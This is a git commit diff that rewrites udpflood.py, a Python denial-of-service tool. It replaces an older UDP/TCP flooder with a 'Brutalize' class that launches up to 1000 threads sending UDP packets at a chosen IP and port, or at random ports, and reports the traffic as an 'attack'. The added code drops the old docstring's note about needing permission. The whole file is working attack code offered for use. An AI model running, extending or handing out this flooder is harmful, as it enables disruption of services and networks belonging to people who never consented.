3313ede2a91329a2c197cf732c439489eff07df3
Pulse <72387902+cintagram@users.noreply.github.com>
2023-01-17 11:19:52 +0900

    Update udpflood.py

--- udpflood.py
+++ udpflood.py
@@ -1,119 +1,128 @@
-"""
-UDP Flooder.
-This is a 'Dos' attack program to attack servers, you set the IP always that you have permission to do it.
-and the port and the amount of seconds and it will start flooding to that server.
-Created by Xavi Fortes -> https://github.com/XaviFortes/Python-UDP-Flood
-Usage : ./flood_udp
-Press enter to continue and introduce the data.
-"""
-import signal
-import time
-import socket
-import random
-import threading
-import sys
+from socket import socket, AF_INET, SOCK_DGRAM
+
+from threading import Thread
+from random import choices, randint
+from time import time, sleep
+from getpass import getpass as hinput
 import argparse
-import os
-from os import system, name
+
+
+class Brutalize:
+
+    def __init__(self, ip, port, force, threads):
+        self.ip = ip
+        self.port = port
+        self.force = force # default: 1250
+        self.threads = threads # default: 100
+
+        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
+        # self.data = self._randbytes()
+        self.data = str.encode("x" * self.force)
+        self.len = len(self.data)
+
+    def flood(self):
+        self.on = True
+        self.sent = 0
+        for _ in range(self.threads):
+            Thread(target=self.send).start()
+        Thread(target=self.info).start()
+    
+    def info(self):
+
+        interval = 0.05
+        now = time()
+
+        size = 0
+        self.total = 0
+
+        bytediff = 8
+        mb = 1000000
+        gb = 1000000000
+        
+
+        while self.on:
+            sleep(interval)
+            if not self.on:
+                break
+
+            if size != 0:
+                self.total += self.sent * bytediff / gb * interval
+                print((f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' '*20}"), end='\r')
+
+            now2 = time()
+        
+            if now + 1 >= now2:
+                continue
+            
+            size = round(self.sent * bytediff / mb)
+            self.sent = 0
+
+            now += 1
+
+    def stop(self):
+        self.on = False
+
+    def send(self):
+        while self.on:
+            try:
+                self.client.sendto(self.data, self._randaddr())
+                self.sent += self.len
+            except:
+                pass
+    def _randaddr(self):
+        return (self.ip, self._randport())
+
+    def _randport(self):
+        return self.port or randint(1, 65535)
+
+
 
 ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
 ap.add_argument("-p", "--port", required=True, type=int, help="Port")
-ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
 ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
-ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
+ap.add_argument("-th", "--threads", type=int, default=1000, help="Threads")
 args = vars(ap.parse_args())
 
 
 ip = args['ip']
 port = args['port']
-choice = args['choice']
 times = args['times']
 threads = args['threads']
-#os.system("figlet DDOS ATTACK -f slant")
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +"UDP Sent!!!")
-		except:
-			s.close()
-			print("[!] Error!!!")
 
-def run2():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +"TCP Sent!!!")
-		except:
-			s.close()
-			print("[*] Error")
 
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading.Thread(target = run2)
-		th.start()
 
-def new():
-	for y in range(threads):
-		if choice == 'y':
-			th = threading.Thread(target = run)
-			th.start()
-		else:
-			th = threading.Thread(target = run2)
-			th.start()
 
-def whereuwere():
-    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
-    print("Put 1 for UDP and 2 for TCP")
-    whereman = str(input(" 1 or 2 >:("))
-    if whereman == '1':
-        run()
-    else:
-        run2()
+def main():
 
-def clear():
-    if name == 'nt':
-        _ = system('cls')
-    else:
-        _ = system('clear')
 
-def byebye():
-	clear()
-	os.system("figlet Youre Leaving Sir -f slant")
-	sys.exit(130)
+    force = times
+    
 
-def exit_gracefully(signum, frame):
-    # restore the original signal handler
-    signal.signal(signal.SIGINT, original_sigint)
 
+    
+
+
+    
+    cport = '' if port is None else f':{port}'
+    print((f"Starting attack on {ip}{cport}."), end='\r')
+
+
+    brute = Brutalize(ip, port, force, threads)
     try:
-        exitc = str(input(" You wanna exit bby <3 ?:"))
-        if exitc == 'y':
-
-            byebye()
-
+        brute.flood()
+    except:
+        brute.stop()
+        print("A fatal error has occured and the attack was stopped.")
+    try:
+        while True:
+            sleep(1000000)
     except KeyboardInterrupt:
-        print("Ok ok")
-        byebye()
+        brute.stop()
+        print((f"Attack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb."))
+    print('\n')
+    sleep(1)
 
-    # restore the gracefully exit handler
-    signal.signal(signal.SIGINT, exit_gracefully)
+    hinput((f"Press enter to exit."))
 
-    # store SIGINT handler
-original_sigint = signal.getsignal(signal.SIGINT)
-signal.signal(signal.SIGINT, exit_gracefully)
+  
